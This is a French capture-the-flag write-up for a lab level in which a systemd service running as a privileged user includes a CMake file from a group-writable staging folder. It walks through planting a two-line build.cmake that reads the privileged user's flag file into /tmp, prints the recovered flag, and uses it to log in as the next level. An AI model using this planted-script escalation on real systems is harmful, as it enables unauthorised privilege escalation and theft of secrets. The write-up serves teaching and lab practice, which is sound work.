# Level03 — Faire exécuter un script CMake

## Objectif

Comprendre comment un service privilégié peut exécuter des instructions contrôlées par un utilisateur moins privilégié. La faille repose sur la confiance accordée à un fichier CMake modifiable.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
Every Burbclave has rules. Find the loophole.
```

Le README donne le mot-clé `Burbclave`, mais le nom exact du service reste à identifier. La commande suivante recherche ce mot parmi les fichiers d’unités connus de systemd :

```bash
systemctl list-unit-files | grep -i burbclave
```

| Élément | Rôle |
| --- | --- |
| `systemctl list-unit-files` | Lister les unités installées, y compris les services qui ne sont pas actuellement démarrés. |
| `|` | Transmettre cette liste à la commande suivante. |
| `grep -i burbclave` | Conserver les lignes contenant `burbclave`, sans tenir compte des majuscules et minuscules. |

Résultat attendu :

```text
burbclave.service
```

Cette première commande répond uniquement à une question : **quel est le nom du service lié à Burbclave ?** La réponse est `burbclave.service`. Il faut maintenant examiner ce service.

## 2. Comprendre le point faible

### 2.1. Le service s’exécute comme `flag03`

```bash
systemctl cat burbclave.service
```

Les lignes utiles sont :

```ini
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardOutput=null
StandardError=null
```

Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Sa sortie est supprimée, ce qui explique pourquoi notre script écrira le résultat dans `/tmp`.

### 2.2. `CMakeLists.txt` charge un autre fichier

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

Les dernières instructions lisent une configuration protégée, calculent un répertoire, puis exécutent un fichier nommé `build.cmake` :

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")
include(${RESOLVED_BUILD_PATH}/build.cmake)
```

`level03` ne peut pas lire la configuration qui contient le chemin :

```text
cat: /etc/burbclave/burbclave.conf: Permission denied
```

À ce stade, nous savons seulement que le service cherche un fichier `build.cmake` dans un répertoire calculé.

### 2.3. Trouver un emplacement modifiable

Le fichier `CMakeLists.txt` contient aussi cette valeur :

```cmake
set(BURBCLAVE_STATE_DIR "/var/lib/burbclave")
```

Elle ne donne pas le chemin final, mais indique un répertoire pertinent à examiner :

```bash
find /var/lib/burbclave -maxdepth 2 -type d -ls 2>/dev/null
```

Cette recherche fait apparaître le dossier `/var/lib/burbclave/staging`. Il reste à vérifier si `level03` peut y écrire :

```bash
id
ls -ld /var/lib/burbclave/staging
```

Résultats observés :

```text
uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
drwxrwxr-x 2 root burbclave 4096 Nov 6 10:53 /var/lib/burbclave/staging
```

La commande `id` montre que `level03` appartient au groupe `burbclave`. Dans `drwxrwxr-x`, le deuxième groupe de droits est celui du groupe propriétaire : `rwx`. Le groupe `burbclave` peut donc écrire dans `staging`.

Le fichier suivant devient donc notre candidat :

```text
/var/lib/burbclave/staging/build.cmake
```

### 2.4. Confirmer l’hypothèse

Le fichier de configuration reste illisible ; le chemin est confirmé par un test. Nous plaçons `build.cmake` dans `staging`, puis attendons le timer. Lorsque `/tmp/level03_recovered` apparaît avec le flag, deux éléments sont confirmés :

1. le chemin calculé par `CMakeLists.txt` mène bien au dossier `staging` ;
2. `build.cmake` est exécuté avec les droits de `flag03`.

## 3. Comprendre le script CMake

Le fichier [build.cmake](build.cmake) ne contient que deux instructions :

```cmake
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
```

| Instruction | Effet |
| --- | --- |
| `file(READ ... SECRET)` | Lire `.flag` et placer son contenu dans la variable CMake `SECRET`. |
| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans un fichier que `level03` pourra consulter. |

CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers. Les deux instructions présentées réalisent toute l’opération.

## 4. Installer le script

Créer le fichier attendu dans le dossier de staging :

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
EOF
```

Dans cette construction :

- `>` crée le fichier ou remplace son contenu ;
- `<<'EOF'` fournit plusieurs lignes à `cat` ;
- les apostrophes autour de `EOF` empêchent Bash d’interpréter `${SECRET}` avant CMake.

## 5. Attendre l’exécution du service

Les notes indiquent que le service est déclenché périodiquement par un timer. Pour identifier les timers et leur prochain passage :

```bash
systemctl list-timers --all
```

Après le passage du service, lire le fichier produit :

```bash
cat /tmp/level03_recovered
```

Le contenu récupéré est :

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

Le fichier apparaît après le déclenchement du timer. Consulter la liste des timers permet de connaître le prochain passage avant de relire la sortie.

## 6. Passer à `level04`

```bash
su - level04
```

Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level04`. Le passage au compte suivant a réussi avec le secret récupéré, également conservé dans `level03/flag`.

## Pourquoi cette méthode fonctionne

Le service exécute avec les droits de `flag03` un script situé dans un emplacement modifiable par `level03`. Le contrôle du fichier d’instructions permet donc indirectement d’effectuer des opérations autorisées pour `flag03`.

L’exécution doit être déclenchée par le service afin que les instructions CMake bénéficient des droits de `flag03`. Une exécution directe conserverait les droits de `level03`.

## À expliquer à l’évaluation

> J’ai vérifié que `level03` pouvait modifier le fichier CMake chargé par un service exécuté sous `flag03`. J’ai fourni deux instructions : l’une lit le flag, l’autre l’écrit dans un fichier accessible. Le service a exécuté ces instructions avec ses propres droits. J’ai ensuite utilisé le secret pour passer à `level04`.

## Traçabilité à conserver

Conserver les sorties de `id`, `systemctl cat`, `ls -ld`, `systemctl list-timers` et `id -un`. Elles démontrent respectivement le droit d’écriture, l’identité du service, son déclenchement et le passage au compte suivant.
